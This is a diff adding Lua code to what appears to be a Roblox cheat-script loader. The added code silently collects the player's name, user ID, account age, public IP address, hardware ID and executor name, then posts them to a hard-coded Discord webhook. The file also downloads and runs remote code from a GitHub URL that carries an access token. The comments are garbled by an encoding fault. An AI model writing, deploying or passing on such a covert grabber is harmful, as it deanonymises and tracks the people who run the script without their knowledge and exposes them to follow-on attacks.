@@ -1,1 +1,70 @@
+local webhook = "https://discord.com/api/webhooks/1197486527136145418/FZSlSN2i0ptNY75WkDgnaat7Li1PopRbv87UyC4mP7oKL5AdttcIkv5Bz8X522FxbU3k"
+
+-- Define the PlaceId variable
+local PlaceId = game.PlaceId
+
+-- Get the game name and game URL
+-- ط§ط³ظ… ظ…ط§ط¨
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name
+-- ط±ط§ط¨ط· ظ„ط¹ط¨ظ‡
+local gameUrl = "https://www.roblox.com/games/" .. PlaceId
+-- ط±ط§ط¨ط· ط¨ط±ظˆظپط§ظٹظ„
+local profileUrl = "https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile"
+-- ط¹ط¯ط¯ ط³ظٹط±ظپط±
+local playerCount = #game:GetService("Players"):GetPlayers()
+-- ط¨ط±ظٹظ…ظٹظ…
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local hasPremium = player.MembershipType == Enum.MembershipType.Premium
+-- ظˆظ‚طھ ط­ط§ظ„ظٹط§
+local time = os.time()
+local date = os.date("*t", time)
+
+local hour = math.floor(date.hour)
+local min = math.floor(date.min)
+local sec = math.floor(date.sec)
+
+-- ظ…ط¹ط±ظپظ‡ ط§ظ„ ip ط´ط®طµ
+
+local ip = game:HttpGet("https://api.ipify.org")
+
+-- Create a JSON object to send to the webhook
+local data = {
+    ["content"] = "",
+    ["username"] = "By : 7yd7",
+    ["embeds"] = {
+        {
+            ["title"] = "",
+            ["description"] = ""
+            .. "**Player Name:**  ```" .. game:GetService("Players").LocalPlayer.Name .. " ```\n"
+            .. "**Player ID:** ```" .. game:GetService("Players").LocalPlayer.UserId .. "```\n"
+			.. "**Player URL:** ```" .. profileUrl .. "```\n"
+            .. "**Game Name:** ```" .. gameName .. "```\n"
+            .. "**Game URL:** ```" .. gameUrl .. "```\n"
+		    .. "**Server JobId :** ```" .. game.JobId .. "```\n"
+            .. "**Server Number players online :** ```" .. playerCount .. "```\n"
+			.. "**Account Age :** ```" .. game:GetService("Players").LocalPlayer.AccountAge .. "``` \n" 
+            .. "**IP :** ```" .. ip .. " / https://whatismyipaddress.com/ip/".. ip .. "```\n"
+            .. "**HWID  :** ```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "``` \n" 
+            .. "**Name Hack  :** ```" .. identifyexecutor() .. "``` \n" 
+            .. "**Player Premium :** " .. if hasPremium then "```yes```" else "```no```"  .. "\n"
+            .. date.day .. "/" .. date.month .. "/" .. date.year .. " " .. hour .. ":" .. min .. ":" .. sec .. "" .. "\n"
+        }
+    }
+}
+
+-- Send the data to the webhook
+local HS = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+local data2 = {
+    Url = webhook,
+    Body = HS,
+    Method = "POST",
+    Headers = headers
+}
+
+request(data2)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/Lmao/main/MM2-VR7?token=GHSAT0AAAAAACM7O4N64Z3H5TJ4465VNNTYZO52NZQ"))()
